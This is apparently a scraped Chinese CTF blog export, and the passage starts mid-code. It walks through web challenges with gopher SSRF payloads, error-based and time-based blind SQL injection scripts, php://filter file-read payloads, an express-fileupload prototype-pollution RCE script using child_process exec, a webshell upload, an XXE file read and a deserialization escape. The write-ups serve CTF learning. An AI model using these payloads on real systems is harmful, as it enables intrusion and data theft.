&#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出:gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVCh0YWJsZV9uYW1lKWZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9J3NlY3VyaXR5JyksMHg3ZSkpICM%253D%250D%250A%250D%250A\n\n这里有过滤，似乎是过滤了group_concat\n查列：admin') and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name='flag'),0x7e)) #\nimport urllib.parseimport base64host = &quot;127.0.0.1:80&quot;payload = &quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select GROUP_CONCAT(column_name)from information_schema.columns WHERE table_name=&#x27;flag&#x27;),0x7e)) #&quot;base64_payload = str(base64.b64encode(payload.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)cookie=&quot;this_is_your_cookie=&quot;+base64_payloadtest =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: &#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出：gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IEdST1VQX0NPTkNBVChjb2x1bW5fbmFtZSlmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX25hbWU9J2ZsYWcnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A\n\n查内容\nadmin') and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #\nimport urllib.parseimport base64host = &quot;127.0.0.1:80&quot;payload = &quot;admin&#x27;) and extractvalue(1, concat(0x7e, (select flag from flag),0x7e)) #&quot;base64_payload = str(base64.b64encode(payload.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)cookie=&quot;this_is_your_cookie=&quot;+base64_payloadtest =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: &#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出：gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCAoc2VsZWN0IGZsYWcgZnJvbSBmbGFnKSwweDdlKSkgIw%253D%253D%250D%250A%250D%250A\n\n此时出现了另一个问题，报错的回显最大位数为32位，此时我们只获得了32位，需要用substr函数进行分割读取：\n分割读取\nadmin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #\nimport urllib.parseimport base64host = &quot;127.0.0.1:80&quot;payload = &quot;admin&#x27;) and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #&quot;base64_payload = str(base64.b64encode(payload.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;)cookie=&quot;this_is_your_cookie=&quot;+base64_payloadtest =\\&quot;&quot;&quot;GET /index.php HTTP/1.1Host: &#123;&#125;Connection: closeContent-Type: application/x-www-form-urlencodedCookie:&#123;&#125;&quot;&quot;&quot;.format(host,cookie)tmp = urllib.parse.quote(test)new = tmp.replace(&quot;%0A&quot;,&quot;%0D%0A&quot;)result = urllib.parse.quote(new)print(&quot;gopher://&quot;+host+&quot;/_&quot;+result)\n输出：gopher://127.0.0.1:80/_GET%2520/index.php%2520HTTP/1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AConnection%253A%2520close%250D%250AContent-Type%253A%2520application/x-www-form-urlencoded%250D%250ACookie%253Athis_is_your_cookie%253DYWRtaW4nKSBhbmQgZXh0cmFjdHZhbHVlKDEsIGNvbmNhdCgweDdlLCBzdWJzdHIoKFNFTEVDVCBmbGFnIGZyb20gZmxhZyksMzAsMzIpLDB4N2UpKSAj%250D%250A%250D%250A\n\n时间盲注\n这里分享时间盲注脚本\nimport requests #导入库requests,用于发送HTTP请求，注意这个需要安装import time #导入库time，用于计时import base64 #导入库base64，用于转码 url = &quot;http://61.147.171.105:64317/use.php?url=&quot; #http://61.147.171.105:64317是网址及端口，需要更改；/use.php是源码提示的SSRF跳板网址；url=后接需要跳转的网址flag = &quot;&quot; #准备输出flag字符串for pos in range(1, 50):    for i in range(33, 127):        # poc=&quot;&#x27;) union select 1,2,if(1=1,sleep(5),1) # &quot; #&#x27;)注释，联合查询 1，2，延时注入猜测注入点         # security        # poc=&quot;&#x27;) union select 1,2,if(ascii( substr((database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; #联合查询，ascii编码延时注入猜测库名         # flag        # poc=&quot;&#x27;) union select 1,2,if(ascii( substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&quot;+str(pos)+&quot;,1) )=&quot;+str(i)+&quot;,sleep(2),1) # &quot; #联合查询，猜测文件名         poc = &quot;&#x27;) union select 1,2,if(ascii( substr((select * from flag),&quot; + str(pos) + &quot;,1) )=&quot; + str(            i) + &quot;,sleep(2),1) # &quot; #读取文件flag中的值         bs = str(base64.b64encode(poc.encode(&quot;utf-8&quot;)), &quot;utf-8&quot;) #flag的值经过utf-8于base64编码        final_poc = &quot;gopher://127.0.0.1:80/_GET%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aCookie%3A%20this%5Fis%5Fyour%5Fcookie%3D&quot; + bs + &quot;%3B%250d%250a&quot; #需要解码，内容请参考截图        t1 = time.time()         res = requests.get(url + final_poc)        t2 = time.time()        if (t2 - t1 &gt; 2):#以上四行为延时注入的时间判断语句，爆破期间如果某字符返回响应的时间较长            flag += chr(i) #写入字符串flag            print(flag) #输出flag            break #进入下一字符的爆破print(flag)\n其中 变量final_poc经过两次url解码，内容如下所示，将变量bs(编码后的变量poc)传到服务器~\n\n参考文章：\n剩下的细节就参考：gopher协议基础\ngopher实战1：gopher协议的利用 - FreeBuf网络安全行业门户\ngopher实战2：Gopher协议在SSRF漏洞中的深入研究（附视频讲解） - 知乎 (zhihu.com)\nSSRF实战1：SSRF漏洞 - Saint_Michael - 博客园 (cnblogs.com)\nSSRF实战2：SSRF深入各种高级实战用法_G0mini的博客-CSDN博客\nSSRF实战3：ssrf漏洞利用(内网探测、打redis) - ctrl_TT豆 - 博客园 (cnblogs.com)\nwp参考1\nwp参考2\n","categories":["攻防世界"]},{"title":"攻防世界-文件包含","url":"/2023/08/22/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/","content":"题目描述：\n简单的文件包含-泰山杯\n题目解题：\n\n果然，代码很简单，但肯定过滤的很伤感~，简单测试几下\n\n发现被过滤了，随后又测试了一番，发现过滤了一些关键字，那肯定就用到php伪协议+convert转换过滤器，不过这里没有深入总结，此次就总结一番。\nconvert转换过滤器\n常见的convert转换过滤器有这两种：\nconvert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt;convert.quoted-printable-encode\n对于第一种来说，它通过 PHP 的 iconv 扩展实现，该扩展可以帮助将输入数据从指定的字符编码（）转换为另一个字符编码（）\n其中input-encoding、output-encoding支持的编码格式为：\nUCS-4*UCS-4BEUCS-4LE*UCS-2UCS-2BEUCS-2LEUTF-32*UTF-32BE*UTF-32LE*UTF-16*UTF-16BE*UTF-16LE*UTF-7UTF7-IMAPUTF-8*ASCII*EUC-JP*SJIS*eucJP-win*SJIS-win*ISO-2022-JPISO-2022-JP-MSCP932CP51932SJIS-mac（别名：MacJapanese）SJIS-Mobile#DOCOMO（别名：SJIS-DOCOMO）SJIS-Mobile#KDDI（别名：SJIS-KDDI）SJIS-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）UTF-8-Mobile#DOCOMO（别名：UTF-8-DOCOMO）UTF-8-Mobile#KDDI-AUTF-8-Mobile#KDDI-B（别名：UTF-8-KDDI）UTF-8-Mobile#SOFTBANK（别名：UTF-8-SOFTBANK）ISO-2022-JP-MOBILE#KDDI（别名：ISO-2022-JP-KDDI）JISJIS-msCP50220CP50220rawCP50221CP50222ISO-8859-1*ISO-8859-2*ISO-8859-3*ISO-8859-4*ISO-8859-5*ISO-8859-6*ISO-8859-7*ISO-8859-8*ISO-8859-9*ISO-8859-10*ISO-8859-13*ISO-8859-14*ISO-8859-15*ISO-8859-16*byte2bebyte2lebyte4bebyte4leBASE64HTML-ENTITIES（别名：HTML）7bit8bitEUC-CN*CP936GB18030HZEUC-TW*CP950BIG-5*EUC-KR*UHC（别名：CP949）ISO-2022-KRWindows-1251（别名：CP1251）Windows-1252（别名：CP1252）CP866（别名：IBM866）KOI8-R*KOI8-U*ArmSCII-8（别名：ArmSCII8）\n对于本题，payload为：\n?filename=php://filter/convert.iconv.UTF-8.UTF-16/resource=check.php\n回显如下：\n\n说明过滤器正确，但用法错误，此时可以bp爆破一下正确的组合情况\n\n找到有回显的，即是正确的，我们直接用其读取flag\n?filename=php://filter/convert.iconv.SJIS%2a.UCS-4%2a/resource=flag.php\n\n参考文章：\nwp参考一\nwp参考二\n","categories":["攻防世界"]},{"title":"攻防世界-BadProgrammer","url":"/2023/09/02/BadProgrammer/","content":"题目描述：\n我是一个程序员，我什么也不会。\n题目解题：\n\n看一下页面，有几个可点击的按钮，不过没什么反应，查看源代码也没发现可疑点。于是用dirsearch扫了一下，发现url/static…/看到了目录\n\n点开几个看了看，发现几个可疑文件\nflag.ejs\n&lt;html&gt;    &lt;head&gt;        &lt;title&gt;flag?&lt;/title&gt;    &lt;/head&gt;    &lt;body&gt;        No No No, flag is in `flag.txt`.    &lt;/body&gt;&lt;/html&gt;\napp.js\nconst express = require(&#x27;express&#x27;);const fileUpload = require(&#x27;express-fileupload&#x27;);const app = express();app.use(fileUpload(&#123; parseNested: true &#125;));app.post(&#x27;/4_pATh_y0u_CaNN07_Gu3ss&#x27;, (req, res) =&gt; &#123;    res.render(&#x27;flag.ejs&#x27;);&#125;);app.get(&#x27;/&#x27;, (req, res) =&gt; &#123;    res.render(&#x27;index.ejs&#x27;);&#125;)app.listen(3000);app.on(&#x27;listening&#x27;, function() &#123;    console.log(&#x27;Express server started on port %s at %s&#x27;, server.address().port, server.address().address);&#125;);\n在app中发现，这是一个express框架，但不知道是是什么漏洞，可能是文件上传，于是借鉴了wp发现了原型链污染\n原型链污染漏洞\n查看package.json文件，发现引用express-fileupload版本为1.1.7-alpha.4，此版本存在CVE-2020-7699，原型链污染漏洞。\nCVE-2020-7699：NodeJS模块代码注入该漏洞完全是由于Nodejs的express-fileupload模块引起，该模块的1.1.8之前的版本存在原型链污染（Prototype Pollution）漏洞，当然，引发该漏洞，需要一定的配置：parseNested选项设置为true该漏洞可以引发DOS拒绝服务攻击，配合ejs模板引擎，可以达到RCE的目的\n通过污染ejs中outputFunctionName变量，实现RCE：\nimport requestsresp1 = requests.post(&quot;http://&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;.format(&#x27;61.147.171.105&#x27;, &#x27;62577&#x27;, &#x27;4_pATh_y0u_CaNN07_Gu3ss&#x27;),        files=&#123;&#x27;__proto__.outputFunctionName&#x27;:         (            None, &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;.format(cmd=&#x27;cp /flag.txt /app/static/js/flag.txt&#x27;)        )&#125;)print(resp1)\n访问，即可得到 flag\nhttp://ip/static/js/flag.txt\n\n具体复现就在漏洞库进行了\n参考文章：\n【愚公系列】2023年06月 攻防世界-Web（BadProgrammer）\n","categories":["攻防世界"]},{"title":"MoeCTF 2023 - 持续更新","url":"/2023/08/30/MoeCTF%202023-wp/","content":"签到\nhello CTFer\n这里我是校外用户：\nhttps://cyberchef.org/#recipe=From_Base64(&#x27;A-Za-z0-9%2B/%3D&#x27;,true,false)&amp;input=Ylc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk\n将这一段Ylc5bFkzUm1lMWRsTVdOdmJUTmZkREJmYlRCbFkzUm1Yekp2TWpNaElTRjk\t进行2次base64解密即可\n![image-20230830095146518](MoeCTF 2023-wp/image-20230830095146518.png)\nWeb\nhttp\n![image-20230830095314701](MoeCTF 2023-wp/image-20230830095314701.png)\n简单的参数设置，get传参?UwU=u，post传Luv=u，修改character=admin，修改xff头为127.0.0.1，修改ua头为MoeBrowser即可\n![image-20230830095702379](MoeCTF 2023-wp/image-20230830095702379.png)\n![image-20230830095709297](MoeCTF 2023-wp/image-20230830095709297.png)\n![image-20230830095713975](MoeCTF 2023-wp/image-20230830095713975.png)\n![image-20230830095718032](MoeCTF 2023-wp/image-20230830095718032.png)\nWeb入门指北\n![image-20230830095841779](MoeCTF 2023-wp/image-20230830095841779.png)\n简单解密，做题多了就会认为这是16进制转字符串解密，随后再base64解密即可\n![image-20230830100024678](MoeCTF 2023-wp/image-20230830100024678.png)\n![image-20230830100039939](MoeCTF 2023-wp/image-20230830100039939.png)\n彼岸的flag\n![image-20230830100141555](MoeCTF 2023-wp/image-20230830100141555.png)\n翻了翻聊天记录，没啥信息，那就看一下源代码\n![image-20230830100204533](MoeCTF 2023-wp/image-20230830100204533.png)\n成功找到flag\ncookie\n先看看附件给了什么\n![image-20230830100606413](MoeCTF 2023-wp/image-20230830100606413-1693361166984-1.png)\n这是竟然直接给了如何获取flag，不过肯定没那么简单，我们先试试\n![image-20230830100638898](MoeCTF 2023-wp/image-20230830100638898-1693361199190-3.png)\n果然是错的，那我们先注册看看\n![image-20230830100944770](MoeCTF 2023-wp/image-20230830100944770.png)\n在登录一下\n![image-20230830101028269](MoeCTF 2023-wp/image-20230830101028269.png)\n这里发现出现个token，那难道是垂直越权？不管怎样，先解码一下\n![image-20230830101057502](MoeCTF 2023-wp/image-20230830101057502.png)\n那大概率就是修改role为admin去访问flag，这样才满足root权限\n那我们去访问flag并且修改token\n![image-20230830102741721](MoeCTF 2023-wp/image-20230830102741721.png)\n![image-20230830102735480](MoeCTF 2023-wp/image-20230830102735480.png)\n得到flag\ngas!gas!gas!\n![image-20230830103144086](MoeCTF 2023-wp/image-20230830103144086.png)\n打开页面，没咋看懂，查看源代码也没信息，所以我们随便提交几下，看看页面的信息\n![image-20230830103220275](MoeCTF 2023-wp/image-20230830103220275.png)\n说id可能会帮助你定位信息\nmoe图床\n![image-20230830105737987](MoeCTF 2023-wp/image-20230830105737987.png)\n打开是一个文件上传，这里先看一下源代码\n![image-20230830105801041](MoeCTF 2023-wp/image-20230830105801041.png)\n发现有个upload.php页面，访问看看，进行代码审计\n &lt;?php$targetDir = &#x27;uploads/&#x27;;$allowedExtensions = [&#x27;png&#x27;];if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27; &amp;&amp; isset($_FILES[&#x27;file&#x27;])) &#123;    $file = $_FILES[&#x27;file&#x27;];    $tmp_path = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];    if ($file[&#x27;type&#x27;] !== &#x27;image/png&#x27;) &#123;        die(json_encode([&#x27;success&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;文件类型不符合要求&#x27;]));    &#125;    if (filesize($tmp_path) &gt; 512 * 1024) &#123;        die(json_encode([&#x27;success&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;文件太大&#x27;]));    &#125;    $fileName = $file[&#x27;name&#x27;];    $fileNameParts = explode(&#x27;.&#x27;, $fileName);    if (count($fileNameParts) &gt;= 2) &#123;        $secondSegment = $fileNameParts[1];        if ($secondSegment !== &#x27;png&#x27;) &#123;            die(json_encode([&#x27;success&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;文件后缀不符合要求&#x27;]));        &#125;    &#125; else &#123;        die(json_encode([&#x27;success&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;文件后缀不符合要求&#x27;]));    &#125;    $uploadFilePath = dirname(__FILE__) . &#x27;/&#x27; . $targetDir . basename($file[&#x27;name&#x27;]);    if (move_uploaded_file($tmp_path, $uploadFilePath)) &#123;        die(json_encode([&#x27;success&#x27; =&gt; true, &#x27;file_path&#x27; =&gt; $uploadFilePath]));    &#125; else &#123;        die(json_encode([&#x27;success&#x27; =&gt; false, &#x27;message&#x27; =&gt; &#x27;文件上传失败&#x27;]));    &#125;&#125;else&#123;    highlight_file(__FILE__);&#125;?&gt;\n这里绕过前端抓包后，修改image类型，文件内存不用管，$secondSegment = $fileNameParts[1];这里如果我们文件是1.php，那么\nsecondSegment变量为php，因此if($secondSegment !== 'png')想要满足这个，我们可以设置为1.png.php，上传后依然被当做php文件解析，这是Apache解析漏洞\n上传后得到路径\n![image-20230830112018057](MoeCTF 2023-wp/image-20230830112018057.png)\n我们蚁剑连接即可\n![image-20230830112035967](MoeCTF 2023-wp/image-20230830112035967.png)\n![image-20230830112059182](MoeCTF 2023-wp/image-20230830112059182.png)\n找到flag\n了解你的座驾\n![image-20230830113443403](MoeCTF 2023-wp/image-20230830113443403.png)\n查看源码找到一段js代码\n&lt;script&gt;\t\tfunction submitForm(name) &#123;\t\t\tvar form = document.createElement(&quot;form&quot;);\t\t\tform.method = &quot;post&quot;;\t\t\tform.action = &quot;index.php&quot;;\t\t\tvar input = document.createElement(&quot;input&quot;);\t\t\tinput.type = &quot;hidden&quot;;\t\t\tinput.name = &quot;xml_content&quot;;\t\t\tinput.value = &quot;&lt;xml&gt;&lt;name&gt;&quot; + name + &quot;&lt;/name&gt;&lt;/xml&gt;&quot;;\t\t\tform.appendChild(input);\t\t\tdocument.body.appendChild(form);\t\t\tform.submit();\t\t&#125;\t&lt;/script&gt;\ninput.value = “” + name + “”;\n在这个代码片段中，将用户提供的 name 参数直接插入到 XML 数据中，没有对其进行任何过滤或转义。这意味着如果用户提供了包含外部实体引用的恶意输入，那么这些实体引用可能会被解析，从而触发 XXE 漏洞。\n那我们点击一辆车并bp抓包\npayload如下：\n&lt;!DOCTYPE test [&lt;!ENTITY poc SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;xml&gt;&lt;name&gt;&amp;poc;&lt;/name&gt;&lt;/xml&gt;\n记得url编码一下\n![image-20230830114456692](MoeCTF 2023-wp/image-20230830114456692.png)\n![image-20230830114449681](MoeCTF 2023-wp/image-20230830114449681-1693367090019-5.png)\n得到flag\n大海捞针\n![image-20230830114912903](MoeCTF 2023-wp/image-20230830114912903.png)\n看到提示那我们抓包爆破一下id看看\n![image-20230830114933322](MoeCTF 2023-wp/image-20230830114933322.png)\n![image-20230830115522971](MoeCTF 2023-wp/image-20230830115522971.png)\n找到id=341，拿到flag\n夺命十三枪\n直接审计代码\n&lt;?phphighlight_file(__FILE__);require_once(&#x27;Hanxin.exe.php&#x27;);$Chant = isset($_GET[&#x27;chant&#x27;]) ? $_GET[&#x27;chant&#x27;] : &#x27;夺命十三枪&#x27;;//判断chant参数是否存在$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);//new一个类对象$before = serialize($new_visitor);//序列化$after = Deadly_Thirteen_Spears::Make_a_Move($before);echo &#x27;Your Movements: &#x27; . $after . &#x27;&lt;br&gt;&#x27;;try&#123;    echo unserialize($after);//反序列化&#125;catch (Exception $e) &#123;    echo &quot;Even Caused A Glitch...&quot;;&#125;?&gt; Your Movements: O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:15:&quot;夺命十三枪&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;Far away from COOL...\n那我们就只能看一下Hanxin.exe.php文件\n &lt;?phpif (basename($_SERVER[&#x27;SCRIPT_FILENAME&#x27;]) === basename(__FILE__)) &#123;    highlight_file(__FILE__);&#125;class Deadly_Thirteen_Spears&#123;    private static $Top_Secret_Long_Spear_Techniques_Manual = array(        &quot;di_yi_qiang&quot; =&gt; &quot;Lovesickness&quot;,        &quot;di_er_qiang&quot; =&gt; &quot;Heartbreak&quot;,        &quot;di_san_qiang&quot; =&gt; &quot;Blind_Dragon&quot;,        &quot;di_si_qiang&quot; =&gt; &quot;Romantic_charm&quot;,        &quot;di_wu_qiang&quot; =&gt; &quot;Peerless&quot;,        &quot;di_liu_qiang&quot; =&gt; &quot;White_Dragon&quot;,        &quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,        &quot;di_ba_qiang&quot; =&gt; &quot;Kunpeng&quot;,        &quot;di_jiu_qiang&quot; =&gt; &quot;Night_Parade_of_a_Hundred_Ghosts&quot;,        &quot;di_shi_qiang&quot; =&gt; &quot;Overlord&quot;,        &quot;di_shi_yi_qiang&quot; =&gt; &quot;Letting_Go&quot;,        &quot;di_shi_er_qiang&quot; =&gt; &quot;Decisive_Victory&quot;,        &quot;di_shi_san_qiang&quot; =&gt; &quot;Unrepentant_Lethality&quot;    );    public static function Make_a_Move($move)&#123;        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index =&gt; $movement)&#123;            $move = str_replace($index, $movement, $move);   //这里容易想到字符串逃逸        &#125;        return $move;    &#125;&#125;class Omg_It_Is_So_Cool_Bring_Me_My_Flag&#123;    public $Chant = &#x27;&#x27;;    public $Spear_Owner = &#x27;Nobody&#x27;;//这里肯定想要修改为MaoLei    function __construct($chant)&#123;        $this-&gt;Chant = $chant;        $this-&gt;Spear_Owner = &#x27;Nobody&#x27;;    &#125;    function __toString()&#123;        if($this-&gt;Spear_Owner !== &#x27;MaoLei&#x27;)&#123;//这里给其改一下赋值即可            return &#x27;Far away from COOL...&#x27;;        &#125;        else&#123;            return &quot;Omg You&#x27;re So COOOOOL!!! &quot; . getenv(&#x27;FLAG&#x27;);        &#125;    &#125;&#125;?&gt;\n很明显就是字符串逃逸了，看一下页面输出的内容\nYour Movements: O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:15:&quot;夺命十三枪&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;那我们直接在此序列化字符串上修改即可，这里我们是想要Spear_Owner为Maolei，也就是如下&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;字符串，我们需要将其成功合并到字符串上，那就要将;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;给挤出去，故此我们选一个字符串替换后数量增加的，也就是&quot;di_qi_qiang&quot; =&gt; &quot;Penetrating_Gaze&quot;,注意这里&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;为35个，那我们要输入di_qi_qiang七个，那么最后会多出35个将上列字符串挤出去\n最终payload为：\n?chant=Penetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_GazePenetrating_Gaze&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Maolei&quot;;&#125;\n出去旅游的心海\n![image-20230831103708841](MoeCTF 2023-wp/image-20230831103708841.png)\n打开首页，随便点击了几下没发现东西，那看一下源代码\n![image-20230831103913918](MoeCTF 2023-wp/image-20230831103913918.png)\n发现可疑处，这里显示了一个url地址，我们拼接访问一下看看\n &lt;?php/*Plugin Name: Visitor auto recorderDescription: Automatically record visitor&#x27;s identification, still in development, do not use in industry environment!Author: KoKoMi  Still in development! :)*/// 不许偷看！这些代码我还在调试呢！highlight_file(__FILE__);// 加载数据库配置，暂时用硬编码绝对路径require_once(&#x27;/var/www/html/wordpress/&#x27; . &#x27;wp-config.php&#x27;);$db_user = DB_USER; // 数据库用户名$db_password = DB_PASSWORD; // 数据库密码$db_name = DB_NAME; // 数据库名称$db_host = DB_HOST; // 数据库主机// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下// 这些是临时的代码$ip = $_POST[&#x27;ip&#x27;];$user_agent = $_POST[&#x27;user_agent&#x27;];$time = stripslashes($_POST[&#x27;time&#x27;]);$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);// 检查连接是否成功if ($mysqli-&gt;connect_errno) &#123;    echo &#x27;数据库连接失败: &#x27; . $mysqli-&gt;connect_error;    exit();&#125;$query = &quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#x27;$ip&#x27;, &#x27;$user_agent&#x27;, $time)&quot;;// 执行插入$result = mysqli_query($mysqli, $query);// 检查插入是否成功if ($result) &#123;    echo &#x27;数据插入成功&#x27;;&#125; else &#123;    echo &#x27;数据插入失败: &#x27; . mysqli_error($mysqli);&#125;// 关闭数据库连接mysqli_close($mysqli);//gpt真好用\n很好，看到了源代码，那我们审一下，这里代码意思是接受三个post传参，随后连接数据库，然后将这几个数据放到数据库进行查询，看是否会返回结果，以此判断是否查询成功，那这里估计就是报错注入了。\n那我们先找一下注入点，在我们以此输入ip，ua头以及time时，你会发现你在修改time为恶意sql语句时，页面内容会有所变化，那我们研究一下time就可以了。\n研究过程中，我一直以为看闭合方式，判断列数啥的，不过如下图，让我不清楚其执行方式了，然后就放弃了\n![image-20230831104607061](MoeCTF 2023-wp/image-20230831104607061.png)\n![image-20230831105022384](MoeCTF 2023-wp/image-20230831105022384.png)\n第二天回来又浅试了几下，想着要不别管其他，直接上database()看看，结果真就行了\n![image-20230831105215902](MoeCTF 2023-wp/image-20230831105215902.png)\n这让我感觉，在我们输入time内容的时候，似乎只有第一位会被执行，也就是1’ database()之类的，他只会执行1所在位置，后续就不会当做sql语句了，这又让我认为估计是sql预编译的问题吗？我也没有深究了，随后就直接开始报错注入，这里采用updatexml函数\n爆表名：\ntime=updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1)\n这里如下图，会看到敏感词汇secret，那估计这就是flag所在地。\n![image-20230831105450883](MoeCTF 2023-wp/image-20230831105450883.png)\n爆列名：\ntime=updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;secret_of_kokomi&#x27;),0x7e),1)\n![image-20230831105648072](MoeCTF 2023-wp/image-20230831105648072.png)\n爆内容：\ntime=updatexml(1,concat(0x7e,(select group_concat(content)from secret_of_kokomi),0x7e),1)\n![image-20230831105732145](MoeCTF 2023-wp/image-20230831105732145.png)\n原本我以为找不到了，结果一想要注意报错注入做多能显示32位字符。于是我接着爆\ntime=updatexml(1,concat(0x7e,(select substring(group_concat(content),30,60)from secret_of_kokomi),0x7e),1)time=updatexml(1,concat(0x7e,(select substring(group_concat(content),80,110)from secret_of_kokomi),0x7e),1)\n![image-20230831105847585](MoeCTF 2023-wp/image-20230831105847585.png)\n看到了flag，接下来就改变数字得到完整的即可\nmoectf&#123;Dig_Thr0ugh_Eve2y_C0de_3nd_Poss1bIlIti3s!!&#125;","categories":["CTF赛事"],"tags":["CTF赛事"]},{"title":"WordPress 远程命令执行漏洞复现(CVE-2018-15877)","url":"/2023/08/25/WordPress%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0(CVE-2018-15877)/","content":"0x01 漏洞简述\n\nWordPress 是一种使用 PHP 语言开发的博客平台，用户可以在支持 PHP 和 MySQL 数据库的服务器上架设属于自己的网站。也可以把 WordPress 当作一个内容管理系统（CMS）来使用。WordPress 使用 PHPMailer 组件向用户发送邮件。PHPMailer (版本 &lt; 5.2.18) 存在远程命令执行漏洞，攻击者只需巧妙地构造出一个恶意邮箱地址，即可写入任意文件，造成远程命令执行的危害。\n\n\n漏洞编号： CVE-2016-10033\n影响版本： WordPress &lt;= 4.7.1 PHPMailer &lt; 5.2.18\n\n漏洞触发条件：\n\nPHP 没有开启 safe_mode（默认）\n攻击者需要知道 Web 服务部署的路径\n\n成功利用该漏洞后，攻击者可以远程任意代码执行。\n0x02 漏洞搭建\n这里我采用vulhub靶场搭建\n进入到/vulhub/wordpress/pwnscriptum/目录后，我们执行命令：\ndocker-compose up -d\n访问对应端口即可，记得安全组放行。进去之后按要求配置信息即可，随后在转到忘记密码页面\n0x03 漏洞原理\n![image-20230829150129261](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829150129261.png)\n此处是管理员重置密码页面，wordpress使用phpmailer组件进行重置密码邮件的发送，但是phpmailer 